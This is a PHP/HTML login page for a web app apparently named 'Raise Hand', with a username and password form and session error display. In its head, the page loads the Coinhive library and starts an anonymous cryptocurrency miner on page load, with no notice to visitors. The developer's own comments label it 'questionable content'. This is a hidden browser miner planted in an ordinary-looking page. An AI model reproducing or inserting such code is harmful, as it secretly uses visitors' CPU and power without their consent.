<?php
  //Clear session
  session_start();
  //Check for error from previous sign in
  if($_SESSION['error']){
    //Do nothing
  }
  else {
    session_unset();
	}
?>

<html>
  <head>
    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
    <link rel="stylesheet" href="css/home.css">
    <script>
	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
	      miner.start();
    </script>
    <!-- End questionable content -->
  </head>
  <body>
    <div id="title" align="center">
      <!--<h1 id="title">Raise Hand</h1>-->
      <img src="uploads/logo.png">
    </div>
    <?php
    if($_SESSION['error']){
        echo "<div align=\"center\"><text style='color: red;'>" . $_SESSION['errorCode'] . "</text></div><br>";
        $_SESSION['error'] = false;
    }
    ?>
      <div align="center" >
        <form id="login-form" action="utilities/signin.php" method="post">
          Username: <br>
          <input type="text" name="username" value="" size="35"><br>
          Password: <br>
          <input type="password" name="password" value="" size="35"><br><br>
          <input name="signin" type="submit" value="Login"><br><br>
          <a class="logout" href="forgotPassword.php">Forgot Password?</a><br>
          <a class="logout" href="newAccount.php">Don't have an account? Sign up here!</a><br>
        </form>
      </div>
  </body>
</html>
